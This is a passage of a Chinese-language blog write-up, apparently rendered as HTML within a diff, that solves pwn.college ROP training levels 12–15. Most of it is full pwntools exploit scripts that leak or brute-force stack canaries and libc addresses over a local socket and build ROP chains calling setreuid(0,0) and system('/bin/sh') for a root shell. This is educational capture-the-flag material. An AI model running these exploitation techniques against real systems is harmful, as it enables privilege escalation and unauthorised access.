class="hljs-keyword">break</span></span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-keyword">out</span></span>)</span><br><span class="hljs-function">p.<span class="hljs-title">interactive</span>()</span><br></code></pre></td></tr></table></figure>
+
+<p>记得<code>p.recvall(1)</code>，设置一下超时时间，因为爆破过程中很有可能会去到libc.so中某个有效地址，从而导致程序hang out，那么你就得重新开始跑。这样的话，重复执行exp多次也不一定能够爆破出来。</p>
+<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>上面的exp直接跑</p>
+<h4 id="level13-0"><a href="#level13-0" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题所有保护都开了，但是题目给了LEAK，让我们泄露canary。泄露出来后，需要覆盖最低的一个字节，让它返回到<code>call main</code>的前面，然后重新执行一遍main，此时再泄露ret地址，因为ret地址减去固定偏移就是<code>libc_base</code>的地址，这样就可以进行ROP了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level13.0&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x78</span><br><br><span class="hljs-comment"># stage_one</span><br>p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>input_buf = <span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>canary_addr = input_buf + <span class="hljs-number">0x78</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(canary_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>canary = p.recvline().strip()<br>canary = <span class="hljs-built_in">int</span>(canary, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x00</span>) + p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><br><span class="hljs-comment"># stage_two</span><br>ret_libc_addr = input_buf + <span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(ret_libc_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, libc_base)<br>libc.address = libc_base<br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>改偏移地址，三个地方：<code>padding</code>，<code>canary_addr</code>，<code>ret_libc_addr</code></p>
+<h4 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h4><p>这题有fork，那大概率是爆破了。思路是，先爆破canary，再爆破main函数的基地址，然后再利用main的基地址进行<code>plt.puts(got.puts)</code>泄露libc基地址，然后根据libc基地址拿到shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak main_addr</span><br>x = <span class="hljs-number">0x01</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>main_addr = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = main_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-comment"># print(payload)</span><br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Goodbye!&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        main_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(main_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: leak libc_addr</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br>e = pro.elf<br>e.address = u64(main_addr) - <span class="hljs-number">0x1fce</span><br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># print(hex(puts_got_addr))</span><br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(e.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>但是很神奇的是，就算canary是正确的，同样的脚本依然会出现”smashing detected ***: terminated”，所以，写一个固定的脚本多跑几次：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>main_addr = <span class="hljs-number">0x5c929d8dffce</span><br>canary = <span class="hljs-number">0xca03b3b9123c1900</span><br>main_base_addr = <span class="hljs-number">0x5c929d8de000</span><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br><br>e = pro.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><span class="hljs-built_in">print</span>(r.dump())<br><br>libc.address = <span class="hljs-number">0x7d3e08419000</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>主要fork下，不是很好调试。不然可以分析一下为什么一会出现canary一会没有出现canary。</p>
+<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h4><p>一样的过程，改偏移地址就行。（包括challenge函数执行后的返回地址，因为是用它算的main基地址）</p>
+<h4 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h4><p>貌似我上一道题有点曲折了，拿到main的基地址就能做很多事了，但是我在ROPgadget中确实没看到systemcall啥的gadget能用。不过好处是，这题反而比上一题简单了。不用爆破main基地址，直接爆破libc基地址，然后就能获得shell。</p>
+<p>返回的libc偏移地址为：<code>0x79dc58fd5083 - 0x79dc58fb1000 = 0x24083 </code></p>
+<p>最后减去就是libc_base的地址。</p>
+<p>但是，有个前提，由于我们无法确定返回到libc_start中是否正确。因此返回地址的最低字节不能是<code>0x83</code>，这样的话就不能控制程序再次调用mian了。所以，爆破libc_addr时，可以以是否再次执行mian来判断该字节爆破的是否正确。exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kill_babyrop_processes</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 查找所有 babyrop_level15 进程</span><br>        pids = subprocess.check_output([<span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;babyrop_level15&quot;</span>]).decode().split()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pids) &gt; <span class="hljs-number">1</span>:       <span class="hljs-comment"># 当出现阻塞进程时</span><br>            subprocess.run([<span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;-9&quot;</span>, pids[<span class="hljs-number">1</span>]], check=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 杀死第二个pid，因为新出现的阻塞进程pid一定会大于原先的pid</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Killed babyrop_level15 (PID: <span class="hljs-subst">&#123;pids[<span class="hljs-number">1</span>]&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 没有找到进程</span><br><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak libc_addr</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>libc_addr = p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = libc_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Welcome to&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        libc_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(libc_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>    kill_babyrop_processes()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(libc_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: calculate libc_base</span><br>kill_babyrop_processes()<br>libc.address = u64(libc_addr) - <span class="hljs-number">0x24060</span>  <span class="hljs-comment"># 注意是减0x60了，而不是0x83，因为我们的返回地址最低字节被手动设置了。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>这里需要杀死后面出现的进程，为什么呢？因为每次返回地址爆破成功时，会导致重新执行main，也就会重新执行listen等等。每爆破一个字节成功，就会重新成为server，并执行到read。那么此时就是阻塞的状态，等待用户输入。所以我们需要将新出现的进程杀死。以便爆破后面的字节。</p>
+<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>改偏移即可。ROP完结撒花！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college: Return Oriented Programming</div>
+      <div>https://loboq1ng.github.io/2025/03/26/pwn-college-Return-Oriented-Programming/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lobo Q1ng</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/28/pwn-college-Intermediate-Memory-Errors/" title="pwn.college: Intermediate Memory Errors">
+                        <i class="iconfont icon-arrowleft"></i>
